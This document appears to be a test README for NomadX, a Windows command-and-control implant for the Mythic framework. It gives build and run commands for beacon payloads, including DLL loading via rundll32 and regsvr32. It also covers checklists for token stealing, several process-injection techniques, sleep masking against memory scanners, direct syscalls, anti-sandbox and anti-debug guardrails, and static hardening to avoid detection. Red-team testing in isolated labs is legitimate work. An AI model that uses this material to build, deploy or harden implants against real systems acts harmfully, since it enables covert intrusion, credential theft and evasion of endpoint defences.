# NomadX Zig smoke test

Two ways to validate the Windows payload:

1. **Local mock C2** — fastest; verifies WinINet, the wire envelope, all basic
   commands, and response handling without a Mythic server.
2. **Live Mythic** — verifies the payload type container, builder, callback
   registration, and Mythic tasking end-to-end.

Run the mock test first. If it passes, a Mythic failure is almost certainly a
profile/builder/network issue rather than the agent core.

## 1. Local mock C2

### Prerequisites

- Linux host reachable from the Windows VM.
- Python 3.10+.
- `cryptography` for encrypted tests: `pip install cryptography`.
- The Zig toolchain in this repo, or `NOMADX_ZIG` (or `NOMAD_ZIG`) pointing at Zig 0.17.1.

### Start the server

Use a fixed UUID so the build and server agree:

```bash
export SMOKE_UUID=11111111-1111-1111-1111-111111111111
python3 tools/mock_c2.py --bind 0.0.0.0 --port 8080 --uuid "$SMOKE_UUID"
```

For an encrypted test, generate a key and pass it to both sides:

```bash
export SMOKE_KEY=$(openssl rand -hex 32)
python3 tools/mock_c2.py --bind 0.0.0.0 --port 8080 --uuid "$SMOKE_UUID" --key "$SMOKE_KEY"
```

The server queues these tasks:

`pwd`, `whoami`, `shell echo nomad-smoke`, `ls C:\`,
`cat C:\Windows\System32\drivers\etc\hosts`, `cd C:\Windows`, `pwd`, `ps`,
`sleep 1 0`, `exit`. The live Mythic suite also covers `mkdir`, `cp`, `mv`, `rm`,
`download`, and `upload` where a test file is available.

### Build the payload

Find the Linux host address reachable from Windows, then:

```bash
python3 tools/build_payload.py \
  --host http://<linux-ip> \
  --port 8080 \
  --uuid "$SMOKE_UUID" \
  --interval 1 \
  --jitter 0 \
  --output dist/nomadx_smoke.exe
```

Encrypted version:

```bash
python3 tools/build_payload.py \
  --host http://<linux-ip> \
  --port 8080 \
  --uuid "$SMOKE_UUID" \
  --aes-key "$SMOKE_KEY" \
  --interval 1 \
  --jitter 0 \
  --output dist/nomadx_smoke.exe
```

The script prints the SHA256 and callback details.

### Run it

Copy `dist/nomadx_smoke.exe` to the Windows VM and run it. It is a GUI-subsystem
binary, so there is no console window and PowerShell may return immediately;
the beacon keeps running in the background. Watch the mock server terminal.

Expected server output ends with:

```text
[=] smoke summary
    PASS  check-in UUID
    PASS  pwd
    PASS  whoami
    PASS  shell
    PASS  ls
    PASS  cat
    PASS  cd
    PASS  pwd after cd
    PASS  ps
    PASS  sleep
    PASS  exit
[=] SMOKE TEST PASSED
```

If any line fails, send the complete server log. It includes the check-in
metadata, each task response, and the failing command.

## 2. Live Mythic

The local Mythic install is referenced by `$MYTHIC_DIR`. The original C++
payload type stays installed as `nomad`. NomadX is deployed separately as
`nomadx`:

```bash
./tools/deploy_mythic.sh
```

This needs `sudo`; it syncs the repository into
`$MYTHIC_DIR/InstalledServices/nomadx`, registers the `nomadx`
service, rebuilds its image (including Zig 0.17.1), and starts Mythic. It does
not modify the installed `nomad` service or the original C++ Nomad tree,
which is kept outside this repository.

In the Mythic UI, select payload type `nomadx`.

When Mythic is up, the UI is at `https://127.0.0.1:7443` (self-signed). The
installed `http` profile listens on port 80 without TLS, so use:

- Payload type: `nomadx`
- C2 profile: `http`
- Callback host: `http://<linux-ip>`
- Callback port: `80`

### Build and run

1. Build a payload in Mythic with the `http` C2 profile.
2. Use the callback host/port above, reachable from the Windows VM.
3. For a self-signed HTTPS listener, set `verify_tls` to false.
4. Run `nomadx.exe` on the Windows VM.
5. Confirm the callback appears in Mythic.

### Command checklist

Issue these tasks and verify each response:

| Command | Expected |
| --- | --- |
| `pwd` | A Windows current-directory path |
| `whoami` | `HOST\user` |
| `shell echo nomad-mythic` | `nomad-mythic` |
| `ls C:\` | Directory entries |
| `cat C:\Windows\win.ini` | File contents, or a clear file error |
| `cd C:\Windows` | `Changed to C:\Windows` |
| `pwd` | `C:\Windows` |
| `ps` | PID/name process list |
| `sleep 1 0` | `Sleep updated: interval=1s jitter=0%` |
| `mkdir C:\Users\Public\nomadx_fs` | `Created` |
| `cp` a test file | `Copied`, destination contents match |
| `mv` the test file | `Moved`, destination contents match |
| `rm` the test file | `Deleted` |
| `download` a test file | Mythic file record completes, correct size/chunks |
| `upload` the downloaded file | `Uploaded`, remote contents match |
| `exit` | `Agent exiting`, callback disappears |

Also verify the callback's sleep metadata updates after `sleep`.

For an automated run through the Mythic API, use a temporary API token:

```bash
python3 tools/mythic_live_test.py \
  --token-file /tmp/mythic_token \
  --callback-display-id <callback-id>
```

It sends the full command sequence, reads the responses back through GraphQL,
and prints a PASS/FAIL summary. Use `--keep-alive` to omit the final `exit`.

For the file-management suite, including a Mythic download/upload round-trip:

```bash
python3 tools/mythic_file_test.py \
  --callback-display-id <callback-id> \
  --base-path 'C:\Users\Public\nomadx_fs' \
  --multi-chunk-size 1200000
```

Use `--no-cleanup` to keep the test files and `--exit` to terminate the callback
at the end. The multi-chunk option verifies chunk registration, chunk numbering,
and upload reassembly.

For SOCKS and reverse port forwarding:

```bash
python3 tools/mythic_proxy_test.py \
  --callback-display-id <callback-id> \
  --http-port 8091 \
  --socks-port 7000 \
  --rpfwd-port 4445 \
  --remote-ip <linux-ip> \
  --target-ip <windows-ip> \
  --firewall
```

`--socks-port` must be inside Mythic's `MYTHIC_SERVER_DYNAMIC_PORTS`
range (`7000-7010` in this install). `--firewall` adds and removes a Windows
inbound rule for the rportfwd listener; omit it if the port is already open.
Stopping `rportfwd` requires the same `remote_ip`/`remote_port` values because
the Mythic command module validates them for both actions.

For BOF/COFF execution:

```bash
python3 tools/mythic_bof_test.py --callback-display-id <callback-id>
```

This runs `whoami_bof`, `arp`, an argument-bearing `nslookup`, and `env`
through the inline `execute_coff` path.

For token and privilege commands:

```bash
python3 tools/mythic_token_test.py \
  --callback-display-id <callback-id> \
  --make-token-domain . \
  --make-token-username testuser \
  --make-token-password password1
```

The script tests `getprivs`, token stealing from `explorer.exe`, token-store
use/remove, `shell` with a stolen token, and `make_token` when credentials are
provided. `blockdlls` is opt-in with `--test-blockdlls`; Microsoft-signed-only
policy is one-way once enabled, so the script does not require disabling it.

### DLL test

Build `output_type=dll` in Mythic, then on the VM:

```powershell
rundll32.exe nomadx.dll,NomadEntry
```

or:

```powershell
regsvr32.exe /s nomadx.dll
```

With `enable_dllmain_start=true`, loading the DLL is enough to start the beacon.

When launching a console loader such as `regsvr32.exe` through the agent's
`shell` command, redirect its standard handles (for example with
`Start-Process -RedirectStandardOutput ... -RedirectStandardError ...`) or use
a detached GUI launcher. Otherwise the child can inherit the shell pipe and
keep the task from completing.

### Shellcode test

Build `output_type=shellcode`; Mythic uses the existing custom donut tool to
produce `nomadx.bin`. The builder passes `-m NomadEntry` deliberately: without
an exported entry point, donut calls `DllMain` and immediately unmaps the DLL
in its cleanup path, killing a beacon that was started on a worker thread.
`NomadEntry` runs the beacon loop inline, so the image stays mapped.

Execute the shellcode with your normal runner. A minimal GUI loader that reads
the file, allocates RWX memory, copies it, and calls `CreateThread` is enough.

### Injection test

Use the generic `inject` command for every technique so the optional `pid`
argument is preserved:

```text
inject -Technique fiber -Shellcode <base64>
inject -Technique callback -Shellcode <base64>
inject -Technique module_stomp -Shellcode <base64>
inject -Technique module_overload -Shellcode <base64> -PID 0
inject -Technique threadless -Shellcode <base64> -PID <target-pid>
inject -Technique kct -Shellcode <base64> -PID <gui-target-pid>
inject -Technique poolparty -Shellcode <base64> [-PID <target-pid>]
inject -Technique earlycascade -Shellcode <base64>
```

Notes:

- `fiber` and `callback` run in the agent process and are easiest to validate
  with shellcode that returns.
- `callback` also has a dedicated `inject_callback` command; choose
  `calendar`, `desktops`, `winstations`, or `geoid`.
- `module_stomp` loads a sacrificial DLL and overwrites its `.text`.
- `module_overload` maps a real DLL image; local PID `0` works, and remote
  targets must not enforce CFG/ACG for the injected thread.
- `threadless` needs a target that calls `NtClose`; the hook restores itself
  before running the shellcode. The generic `inject` form passes the PID.
- `kct` needs a GUI target with a window. The default PID `0` spawns
  `charmap.exe`, which creates a top-level window in the same process. The
  callback is invoked through `WM_COPYDATA`.
- `poolparty` hijacks the target thread-pool timer queue. PID `0` spawns
  `CompPkgSrv.exe`; choose a PID whose process has an `IRTimer` handle if the
  default target is unavailable.
- `earlycascade` spawns a suspended `RuntimeBroker.exe`, patches the ntdll shim
  engine globals, and resumes the loader thread. It ignores the PID argument.

### Sleep-mask test

Build with `sleep_mask=ekko` (default), start the agent, then set a short
interval with the `sleep` command. While the agent is asleep, a memory scanner
should not find the embedded config strings (for example `aes_key_hex`) in the
agent image; they return after the next check-in. `rtl_data` uses the
RtlEncryptMemory path. `ekko_heap` additionally RC4-masks busy blocks of
non-default process heaps.

### execute_pe test

Upload a Windows x64 DLL through the `execute_pe` command (the `New` parameter
group) and optionally name an export. The agent downloads the file if it is not
already cached, maps it over a legitimate `SEC_IMAGE` view, processes
relocations, imports, `.pdata`, and TLS, then calls `DllMain` and the export.

```text
execute_pe -PE <file.dll> [-Export Entry] [-Arguments test]
```

A DLL whose `DllMain` returns TRUE and whose export writes a marker file is
enough to validate the path. PE files without relocations are accepted; x64
DLLs only.
- Real-time Defender/EDR can block remote injection and remove remote
  allocations. Use an isolated lab VM with protection disabled for these
  tests.

For a quick marker payload, a small shellcode that calls `WinExec` and writes
a file under `C:\Users\Public` is sufficient.

### Build-option and guardrail tests

Build alternate payloads from the Mythic UI (or the GraphQL API) with the
following settings. A marker shellcode that calls `WinExec` to write
`C:\Users\Public\nomadx_option_ok.txt` makes the injection tests easy to
observe.

| Option | Test |
| --- | --- |
| `pre_sleep_seconds=15` | Compare the payload process `StartTime` with the first callback `last_checkin`; the gap should be about 15 seconds plus startup. |
| `injection_step_delay_ms=5000` | Run `inject_poolparty`; completion should be roughly 20-25 seconds slower than the same build with `0`. |
| `alloc_strategy=memory_hole` | Run `inject_poolparty` and `inject_earlycascade`; both should complete and run the marker. `standard` should also work. |
| `sacrificial_process=C:\Windows\System32\notepad.exe` | Run `inject_threadless`, `inject_poolparty`, or `inject_earlycascade`; a spawned `notepad.exe` should appear. Use a long-lived target: modern Notepad can hand off and exit, which makes a 5-second step delay fail allocation. |
| `injection_techniques=fiber` | `inject_threadless`, `inject_callback`, and `inject_kct` should return "not included in this build"; `inject_fiber` should still run. |
| `default_injection_technique=none` | `inject` with an empty Technique returns "No injection technique selected". Set it to `fiber` and the same command runs the marker. |
| `use_direct_syscalls=true`, `syscall_mode=indirect` | Guardrails/syscall self test runs, then injection and marker execution should work. The process should contain a private executable page with ten `4C 8B D1 B8` stubs followed by an indirect `FF 25` jump. |
| `use_direct_syscalls=true`, `syscall_mode=direct` | Same, but each stub ends with `0F 05 C3`. Direct and indirect SSNs must match the local ntdll export stubs. |
| `use_direct_syscalls=false`, `syscall_mode=none` | No private syscall-stub page should exist; injection still works through the normal ntdll/Win32 path. |
| `enable_anti_sandbox=true` | The agent should check in on a normal lab VM (uptime >= 30 min, 1024x768+, no sandbox name match, valid `win.ini`). |
| `enable_anti_emulation=true` | The agent should check in after the timing/API/CPU/large-allocation checks. |
| `enable_computational_delay=true` | Startup should include the QPC-based Fibonacci burn instead of only `Sleep`. |
| `enable_anti_debug=true` | The agent should still check in when no debugger is attached. |
| `require_domain_joined=true` | On a non-domain host the process must exit before check-in; no callback is created. |
| `enable_pe_metadata=true` | The EXE/DLL should contain a `.rsrc` section and the configured `CompanyName`/`ProductName` strings (`pe_company`/`pe_product`). |
| `enable_pe_metadata=false` | No `.rsrc` section or metadata strings should be present. |

Do not launch guardrail builds from a Task Scheduler session for the
anti-sandbox test: `GetSystemMetrics`/user32 initialization can block in a
non-interactive session. Use an interactive `Start-Process` for that test.
Task Scheduler is fine for builds with `enable_anti_sandbox=false`.

### Static hardening checks

After building a payload, these should match the C++ Nomad profile:

```bash
x86_64-w64-mingw32-objdump -p nomadx.exe | grep 'DLL Name'
# Only KERNEL32.dll and api-ms-win-crt-* should appear.

strings nomadx.exe | grep -Ei 'COFF|Beacon|BOF|NtAllocate|NtWrite|ntdll\\.dll|wininet\\.dll|aes_key_hex|callback_host'
# No output.

x86_64-w64-mingw32-objdump -p nomadx.exe | grep CheckSum
# Non-zero checksum.
```

The config is now embedded as `agent_config.enc`; `src/agent_config.json` is
only a readable placeholder for development.

## Troubleshooting

- **`docker compose up -d` tries to build unrelated installed services**
  - The deploy script starts only Mythic core, `http`, and `nomadx`.
  - Do not run a blanket `docker compose up -d` on a host with broken or unused
    installed services; start the required services explicitly.
- **No check-in**
  - Verify the Windows VM can reach the callback host/port.
  - Check the Windows firewall and any NAT port forwarding.
  - Confirm `callback_host` includes the right scheme (`http://` or `https://`).
  - For a self-signed HTTPS listener, disable TLS verification.
  - Check the kill date is not in the past.
- **Server logs `HMAC verification failed` or `decode failed`**
  - The build and server must use the same AES key and UUID.
  - Rebuild the payload after changing the key.
- **Agent exits immediately**
  - Check the kill date, callback host, and server response.
  - Run the mock server to distinguish network/Mythic issues from agent issues.
- **`shell` returns empty output**
  - Some commands legitimately produce nothing; try `echo hello`.
- **`ls` or `cat` fails**
  - Use absolute paths and quote paths containing spaces in the Mythic UI.
- **DLL does not start**
  - Use `NomadEntry`/`DllRegisterServer`, or rebuild with
    `enable_dllmain_start=true`.
